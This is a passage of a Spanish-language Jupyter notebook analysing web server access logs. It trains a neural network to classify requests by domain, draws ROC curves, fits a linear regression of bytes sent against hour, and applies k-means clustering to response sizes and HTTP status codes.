   "id": "fc0d37ec-7946-4877-b324-8e2c5dedcc91",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1016676, 22)"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54599620-f56a-4efb-9e3a-8407cb1eb4eb",
   "metadata": {},
   "source": [
    "### Red neuronal (clasificador)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "bd3de182-4d30-466b-b0f5-e37e4ac1dff5",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_2 = df.query(\"domain =='moodle.ucags.edu.mx' or domain == 'dbmanager.designa.mx' or domain == 'intranet.upa.edu.mx'\").copy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "18f2bbe5-6a81-4944-8e17-f77460f96639",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.preprocessing import OneHotEncoder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "ef7932aa-7dec-4b7b-8aa0-891138fe0a35",
   "metadata": {},
   "outputs": [],
   "source": [
    "categorical_cols = [\"req_method\"]\n",
    "encoder = OneHotEncoder(sparse_output=False)\n",
    "one_hot_encoded = encoder.fit_transform(df_2[categorical_cols])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "cf64fc45-440f-4959-a390-98c908a661d7",
   "metadata": {},
   "outputs": [],
   "source": [
    "one_hot_df = pd.DataFrame(one_hot_encoded, columns=encoder.get_feature_names_out(categorical_cols))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "e1b19e73-ff5f-45a1-9f92-156a735c9003",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_encoded = pd.concat([df_2[\"status body_bytes_sent fabstime\".split()].reset_index(), one_hot_df.reset_index()], axis=1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "2a090e54-7791-4116-8ac4-9a2bc022c1cf",
   "metadata": {},
   "outputs": [],
   "source": [
    "X = df_encoded\n",
    "y = df_2[\"domain\"].astype(\"category\").cat.codes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "0b34bd7a-8ed7-4670-8b43-c2e79d2ee098",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "8\n",
      "(392667,)\n"
     ]
    }
   ],
   "source": [
    "print(X.shape[1])\n",
    "print(y.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "74c7e307-18ae-4983-be11-a7c4466e445c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(y.unique())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "cecdf987-7a49-4dbe-baea-ea5aa7049ca8",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.preprocessing import StandardScaler"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "6f365907-03b4-476a-bb25-aa5c766a4c1b",
   "metadata": {},
   "outputs": [],
   "source": [
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=117)\n",
    "\n",
    "scaler = StandardScaler()\n",
    "X_train = scaler.fit_transform(X_train)\n",
    "X_test = scaler.transform(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "12775d31-5f28-4183-b00d-acb36f9ee592",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-15 08:28:27.199221: I tensorflow/core/util/port.cc:113] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.\n",
      "2024-06-15 08:28:27.247923: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n"
     ]
    }
   ],
   "source": [
    "from tensorflow import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "c7713521-d05c-470b-8b3c-fbdf93c9a65e",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-15 08:28:29.063328: E external/local_xla/xla/stream_executor/cuda/cuda_driver.cc:282] failed call to cuInit: UNKNOWN ERROR (34)\n"
     ]
    }
   ],
   "source": [
    "model = keras.Sequential([\n",
    "    keras.layers.Input(shape=(X.shape[1],)),\n",
    "    keras.layers.Dense(128, activation=\"relu\"),\n",
    "    keras.layers.Dense(210, activation=\"relu\"),\n",
    "    keras.layers.Dense(128, activation=\"relu\"),\n",
    "    keras.layers.Dense(len(y.unique()), activation=\"softmax\")\n",
    "])\n",
    "\n",
    "model.compile(optimizer=\"adam\", loss=\"sparse_categorical_crossentropy\", metrics=[\"accuracy\"])\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "4ed0b5a0-7c7c-43c1-ab6f-ae9ff5b2e4f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "X_train, X_val, y_train, y_val = train_test_split(X_train, y_train, test_size=0.2, random_state=117)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "39427d6b-3443-497a-821b-36d43bcacc3e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/5\n",
      "\u001b[1m7854/7854\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m43s\u001b[0m 5ms/step - accuracy: 0.8844 - loss: 0.2622 - val_accuracy: 0.9061 - val_loss: 0.2072\n",
      "Epoch 2/5\n",
      "\u001b[1m7854/7854\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m42s\u001b[0m 5ms/step - accuracy: 0.9042 - loss: 0.2101 - val_accuracy: 0.9102 - val_loss: 0.1981\n",
      "Epoch 3/5\n",
      "\u001b[1m7854/7854\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m39s\u001b[0m 5ms/step - accuracy: 0.9119 - loss: 0.1970 - val_accuracy: 0.9139 - val_loss: 0.1921\n",
      "Epoch 4/5\n",
      "\u001b[1m7854/7854\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m36s\u001b[0m 5ms/step - accuracy: 0.9138 - loss: 0.1919 - val_accuracy: 0.9190 - val_loss: 0.1830\n",
      "Epoch 5/5\n",
      "\u001b[1m7854/7854\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m36s\u001b[0m 5ms/step - accuracy: 0.9168 - loss: 0.1902 - val_accuracy: 0.9140 - val_loss: 0.1858\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<keras.src.callbacks.history.History at 0x7fe5cb8fbd50>"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model.fit(X_train, y_train, epochs=5, validation_data=(X_val, y_val))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "4d217674-5029-4e86-a79e-3a1cef02268c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m2455/2455\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m6s\u001b[0m 3ms/step - accuracy: 0.9136 - loss: 0.1880\n",
      "Perdida test: 0.1854\n",
      "Precision test: 91.53%\n"
     ]
    }
   ],
   "source": [
    "test_loss, test_accuracy = model.evaluate(X_test, y_test)\n",
    "print(f\"Perdida test: {test_loss:.4f}\")\n",
    "print(f\"Precision test: {test_accuracy * 100 :.2f}%\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "2f1a5a90-77a9-4423-aa60-eec9377fe0ff",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m2455/2455\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m5s\u001b[0m 2ms/step\n"
     ]
    }
   ],
   "source": [
    "y_pred = model.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f76caff-734d-45a3-aebf-e62c2dc49046",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75bd9858-5c83-4af1-9958-70e9bb262d47",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "0589db65-25fd-4a62-9b6e-ba0abe8ffc6a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "81         2\n",
       "82         2\n",
       "83         2\n",
       "86         2\n",
       "87         2\n",
       "          ..\n",
       "1016133    2\n",
       "1016134    2\n",
       "1016135    2\n",
       "1016136    2\n",
       "1016262    2\n",
       "Length: 392667, dtype: int8"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "y\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "1c96bff6-e727-41b4-aacd-cb37d41398e7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0         0\n",
       "1     51135\n",
       "2    682734\n",
       "dtype: int64"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "y.groupby(y).sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "49726a4c-7c67-4cb8-9b52-75837f7e142f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.preprocessing import LabelBinarizer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "258df0df-9443-4280-bb95-4ee2f2e0f7fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "label_binarizer = LabelBinarizer().fit(y_train)\n",
    "y_onehot_test = label_binarizer.transform(y_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "4faeb604-b258-447c-bf58-7af3edc2570e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(78534, 3)\n",
      "[[0 0 1]\n",
      " [0 0 1]\n",
      " [0 1 0]\n",
      " [0 0 1]\n",
      " [0 0 1]\n",
      " [0 1 0]\n",
      " [0 0 1]\n",
      " [0 1 0]\n",
      " [0 0 1]\n",
      " [0 0 1]]\n"
     ]
    }
   ],
   "source": [
    "print(y_onehot_test.shape)\n",
    "print(y_onehot_test[:10])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "7952d8e9-3412-4b74-8c7d-1f1c55c603cd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 == [[1 0 0]]\n",
      "1 == [[0 1 0]]\n",
      "2 == [[0 0 1]]\n"
     ]
    }
   ],
   "source": [
    "for i in range(3):\n",
    "    print(f\"{i} == {label_binarizer.transform([i])}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "6ae2cfdc-4bc2-450a-bf67-746666316042",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 == 0\n",
      "1 == 1\n",
      "2 == 2\n"
     ]
    }
   ],
   "source": [
    "for i in range(3):\n",
    "    class_id = np.flatnonzero(label_binarizer.classes_ == i)[0]\n",
    "    print(f\"{i} == {class_id}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "1b67bcbf-c368-413e-9e0a-4e75f2f8289f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 400x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "\n",
    "from sklearn.metrics import RocCurveDisplay\n",
    "\n",
    "display = RocCurveDisplay.from_predictions(\n",
    "    y_onehot_test[:, class_id],\n",
    "    y_pred[:, i],\n",
    "    name=f\"{i} vs the rest\",\n",
    "    color=\"darkorange\",\n",
    "    plot_chance_level=True\n",
    ")\n",
    "_ = display.ax_.set(\n",
    "    xlabel=\"False Positive Rate\",\n",
    "    ylabel=\"True Positive Rate\",\n",
    "    title=\"One vs Rest ROC: 9 vs (0,1,2,3,4,5,6,7,8)\"\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "4be178d7-552b-41b1-b9c0-ca33b6a9c444",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Micro-promedio One vs Rest ROC AUC: 0.9894504068600772\n",
      "Micro-promedio función: 0.9894504068600772\n"
     ]
    }
   ],
   "source": [
    "from sklearn.metrics import auc, roc_curve\n",
    "\n",
    "fpr, tpr, roc_auc = dict(), dict(), dict()\n",
    "\n",
    "# Micro-promedio\n",
    "fpr[\"micro\"], tpr[\"micro\"], micro_thresholds = roc_curve(y_onehot_test.ravel(), y_pred.ravel())\n",
    "roc_auc[\"micro\"] = auc(fpr[\"micro\"], tpr[\"micro\"])\n",
    "\n",
    "print(f\"Micro-promedio One vs Rest ROC AUC: {roc_auc['micro']}\")\n",
    "\n",
    "#===================\n",
    "from sklearn.metrics import roc_auc_score\n",
    "\n",
    "micro_roc_auc_ovr = roc_auc_score(\n",
    "    y_test,\n",
    "    y_pred,\n",
    "    multi_class=\"ovr\",\n",
    "    average=\"micro\"\n",
    ")\n",
    "print(f\"Micro-promedio función: {micro_roc_auc_ovr}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "id": "5f50e78d-b6b7-410a-8ed3-78169ec1e18e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x1000 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig, ax = plt.subplots(figsize=(8,10))\n",
    "\n",
    "plt.xticks(np.arange(0, 1, 0.1))\n",
    "# Dibujar el roc micro\n",
    "plt.plot(\n",
    "    fpr[\"micro\"],\n",
    "    tpr[\"micro\"],\n",
    "    label=f\"micro-prom ROC: (AUC = {roc_auc['micro']:.2f}\",\n",
    "    color=\"deeppink\",\n",
    "    linestyle=\":\",\n",
    "    linewidth=4\n",
    ")\n",
    "\n",
    "colors = [\"darkgray\", \n",
    "          \"lightcoral\", \n",
    "          \"red\",\n",
    "          \"darkorange\",\n",
    "          \"gold\",\n",
    "          \"chartreuse\",\n",
    "          \"forestgreen\",\n",
    "          \"aqua\", \n",
    "          \"orchid\",\n",
    "          \"cornflowerblue\"]\n",
    "\n",
    "# Dibujar cada una de las categorías\n",
    "for i in range(3):\n",
    "    RocCurveDisplay.from_predictions(\n",
    "        y_onehot_test[:, i],\n",
    "        y_pred[:, i],\n",
    "        name=f\"ROC para {i}\",\n",
    "        color=colors[i],\n",
    "        ax = ax,\n",
    "        plot_chance_level=(i == 2)\n",
    "    )\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "7786a45f-df8c-459a-982b-805781fcc19a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Punto de corte óptimo : 0.364\n"
     ]
    }
   ],
   "source": [
    "# Basado en indice de Youden\n",
    "# tomando los true positive rate y false positive rate\n",
    "youden = tpr[\"micro\"] - fpr[\"micro\"]\n",
    "# Al ser un problema de optimización en la que queremos máximizar el true positive rate y minimizar el false positive rate\n",
    "youden_argmax = np.argmax(youden)\n",
    "# Buscamos en los thresholds que nos regresa ROC \n",
    "cut_off = micro_thresholds[youden_argmax]\n",
    "\n",
    "print(f\"Punto de corte óptimo : {cut_off:.3f}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "6071eb6f-0faf-4778-8893-9e450977de6b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.36424586\n"
     ]
    }
   ],
   "source": [
    "print(micro_thresholds[np.argmax(tpr[\"micro\"] - fpr[\"micro\"])])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a51d25ba-4b8f-407e-a630-af41ba7c179e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6228fe77-ca91-4ae8-9f4c-3f146b5701f2",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd6c21b2-5ef1-4fac-bc44-434f34ecfd2a",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3164c7e0-5be6-42b2-996e-e24803af1155",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8bc6b5b9-4561-4008-acb1-ed7f32b1efcd",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "5d67a05f-3472-423f-98a5-e17bd778d26e",
   "metadata": {},
   "source": [
    "## Regresión lineal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5753ba78-bd89-4a82-8ab8-2736cd6f7ef1",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = df[[\"fabstime\", \"body_bytes_sent\"]].to_numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c129c4f3-be43-4d6f-9d81-8b9cc816d292",
   "metadata": {},
   "outputs": [],
   "source": [
    "plt.rcParams['figure.figsize'] = [18, 7]\n",
    "plot = plt.scatter( data[:,0],data[:,1] )\n",
    "plt.title('Distribución de trafico por hora')\n",
    "plt.xlabel('Hora (0-24)')\n",
    "plt.ylabel('Bytes enviados')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27b22214-ccfa-4bae-aec0-255dfb11776c",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"Mínimo {min(data[:,1])}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "378e6c68-b6d2-41ce-9a52-28e9ec613169",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"Máximo {max(data[:,1])}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc090d8a-21d8-4731-91c3-54cf49fd0a1d",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.query(\"body_bytes_sent == 41148667\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9473613a-a215-46c8-8eaf-79c2166496e9",
   "metadata": {},
   "source": [
    "Únicamente basado en este análisis, hace sentido que el máximo sea de 41 Mb ya que se trata de un endpoint de respaldos de bases de datos. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8dbd5fb4-680c-4948-81f7-d6b4f9351f4d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from sklearn.linear_model import LinearRegression\n",
    "\n",
    "x=np.array(df[\"fabstime\"]).reshape(-1,1)\n",
    "y=df[\"body_bytes_sent\"]\n",
    "\n",
    "reg = LinearRegression().fit(x,y)\n",
    "\n",
    "print(f\"Coeficiente (Tetha 1){reg.coef_}\")\n",
    "\n",
    "print(f\"Intercepto (Tetha 0) {reg.intercept_}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd36a409-0150-4168-9134-9256daf63a24",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"Ecuación: y={reg.intercept_} + {reg.coef_[0]}x\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca2a3a99-5f42-4c70-837c-5a8834af7cf0",
   "metadata": {},
   "outputs": [],
   "source": [
    "y_pred = reg.predict(np.array(df[\"fabstime\"]).reshape(-1,1))\n",
    "\n",
    "\n",
    "#plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [18, 7]\n",
    "plt.locator_params(axis='y')\n",
    "plt.scatter(df[\"fabstime\"], df[\"body_bytes_sent\"])\n",
    "\n",
    "plt.plot(x, y_pred, c='red', label = 'Predic')\n",
    "\n",
    "plt.title('Distribución de trafico por hora')\n",
    "plt.xlabel('Hora (0-24)')\n",
    "plt.ylabel('Bytes enviados')\n",
    "plt.legend()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96dd38f2-d2b5-4045-b5b3-4399db9166d7",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dba1be2d-59b7-4cf6-a958-00dc3279643b",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "23a50487-dc83-4dee-8cde-9233433c364a",
   "metadata": {},
   "source": [
    "## Clusterización"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c727d105-e23f-4cf9-a8de-3095711a31b0",
   "metadata": {},
   "outputs": [],
   "source": [
    "plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [18, 7]\n",
    "#plt.pyplot.figure(figsize=(8, 6), dpi=80)\n",
    "plt.scatter(df[\"body_bytes_sent\"], df[\"status\"])\n",
    "plt.title('Cantidad de bytes enviados por estatus HTTP de respuesta')\n",
    "plt.xlabel('Cantidad de bytes')\n",
    "plt.ylabel('Código HTTP de respuesta')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84dd9506-8869-460c-b0ab-ee31c254ba42",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.cluster import KMeans\n",
    "\n",
    "\n",
    "body_status = df.loc[:,[\"body_bytes_sent\", \"status\"]].values\n",
    "\n",
    "wcss = []\n",
    "for i in range(1, 10):\n",
    "  kmeans = KMeans(n_clusters=i,\n",
    "  init = 'k-means++', max_iter = 300, n_init = 3)\n",
    "  kmeans.fit(body_status)\n",
    "  wcss.append(kmeans.inertia_)\n",
    "\n",
    "plt.plot(range(1, 10), wcss)\n",
    "plt.title(\"Método de codo\")\n",
    "plt.xlabel(\"Número de grupos\")\n",
    "plt.ylabel(\"Suma de cuadrados en grupo\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b60eab0-36fd-4676-87b4-a95f068ad9c9",
   "metadata": {},
   "outputs": [],
   "source": [
    "kmeans=KMeans(n_clusters= 4, init = 'k-means++', max_iter = 300, n_init = 10, random_state = 0)\n",
    "y_kmeans = kmeans.fit_predict(body_status)\n",
    "\n",
    "plt.scatter(body_status[y_kmeans == 0, 0], body_status[y_kmeans == 0,1],s = 100, c='red', label = 'Cluster 1')\n",
    "plt.scatter(body_status[y_kmeans == 1, 0], body_status[y_kmeans == 1,1],s = 100, c='cyan', label = 'Cluster 2')\n",
    "plt.scatter(body_status[y_kmeans == 2, 0], body_status[y_kmeans == 2,1],s = 100, c='green', label = 'Cluster 3')\n",
    "plt.scatter(body_status[y_kmeans == 3, 0], body_status[y_kmeans == 3,1],s = 100, c='magenta', label = 'Cluster 4')\n",
    "#plt.scatter(body_status[y_kmeans == 4, 0], body_status[y_kmeans == 4,1],s = 100, c='magenta', label = 'Cluster 5')\n",
    "\n",
    "plt.scatter(kmeans.cluster_centers_[:,0], kmeans.cluster_centers_[:,1], s = 25, c = 'black', label = 'Centroids')\n",
    "\n",
    "plt.title('Clusters of peticiones')\n",
    "plt.xlabel('Cantidad de bytes')\n",
    "plt.ylabel('Código HTTP de respuesta')\n",
    "plt.legend()\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb8abc12-9eb6-4d63-9b10-74f2cdf01656",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.query(\"date_time == '[13/Jun/2023:05:06:49 -0600]'\")[[\"date_time\", \"fdatetime\", \"body_bytes_sent\"]]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9fa03e4-b43e-44b4-a20b-1a21585d3818",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_date_bytes = df.groupby(['fdatetime'], as_index=False).sum([\"body_bytes_sent\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30ae8140-b0c3-4120-ad75-7b73aef74c56",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_date_bytes.head(250)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a175da8-efca-43fb-9ba6-2debb9910500",
   "metadata": {},
   "outputs": [],
   "source": [
    "df_date_bytes.dtypes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd5010e7-8577-4430-81f2-036d557cc7bf",
   "metadata": {},
   "outputs": [],
   "source": [
    "plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [18, 7]\n",
    "plt.locator_params(axis='y', nbins=10)\n",
    "plt.scatter(df_date_bytes.query(\"fdatetime > '2023-06-01 00:00:00'\")[\"fdatetime\"], \n",
    "            df_date_bytes.query(\"fdatetime > '2023-06-01 00:00:00'\")[\"body_bytes_sent\"])\n",
    "plt.title('Distribución de trafico por dia y hora')\n",
    "plt.xlabel('Fecha')\n",
    "plt.ylabel('Cantidad de bytes')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "97659754-04a3-4fa2-bf5a-80e471d0f04a",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "plt.xticks(rotation=90)\n",
    "plt.rcParams['figure.figsize'] = [18, 12]\n",
    "plt.locator_params(axis='y', nbins=10)\n",
    "plt.scatter(df_date_bytes.query(\"fdatetime > '2023-06-14 00:00:00' and fdatetime < '2023-06-15 00:00:00'\")[\"fdatetime\"], \n",
    "            df_date_bytes.query(\"fdatetime > '2023-06-14 00:00:00' and fdatetime < '2023-06-15 00:00:00'\")[\"body_bytes_sent\"])\n",
    "plt.title('Distribución de trafico por dia y hora')\n",
    "plt.xlabel('Fecha')\n",
    "plt.ylabel('Hora (normalizada)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c121ae4e-eec3-4952-9b7a-7dbcc73c4521",
   "metadata": {},
   "outputs": [],
   "source": [
    "max(df_date_bytes[\"body_bytes_sent\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b3f515f-39a8-4ec4-b765-2c7dc87e1e4e",
   "metadata": {},
   "outputs": [],
   "source": [
    "min(df_date_bytes[\"body_bytes_sent\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1956b58e-ba63-4b8c-a3dc-fafa80e10834",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "np.quantile(df_date_bytes[\"body_bytes_sent\"], [0.25, 0.5, 0.75])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1067c489-2b61-42fc-999a-9e1f9205703d",
   "metadata": {},
   "outputs": [],
   "source": [
    "pd.crosstab(df.query(\"domain == 'intranet.upa.edu.mx'\")[\"clean_path\"], df.query(\"domain == 'intranet.upa.edu.mx'\")[\"fdate\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59175949-9209-46d2-beaa-21027629043a",
   "metadata": {},
   "outputs": [],
   "source": [
    "ax = df.groupby(\"date\")[\"remote_addr\"].count().plot(figsize=(10,5))\n",
    "ax.set_xlabel(\"Fecha\")\n",
    "ax.set_ylabel(\"Num peticiones\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2b70360-d77b-4cd8-bf5c-bc027f1bd4de",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = df.query(\"fdatetime > '2023-06-14 00:00:00' and fdatetime < '2023-06-15 00:00:00'\")[[\"status\", \"body_bytes_sent\"]].to_numpy()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3d4dc5b-a9dd-49f0-9c80-360b80164007",
   "metadata": {},
   "outputs": [],
   "source": [
    "len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2faf9cc-890f-44f3-bdf3-735e14a7c96b",
   "metadata": {},
   "outputs": [],
   "source": [
    "data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d21df6b-d3c8-4a91-95c1-84295bef25cc",
   "metadata": {},
   "outputs": [],
   "source": [
    "plot = plt.scatter( data[:,0],data[:,1] )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65dd3478-b20e-4101-b53b-93f94fdf283b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
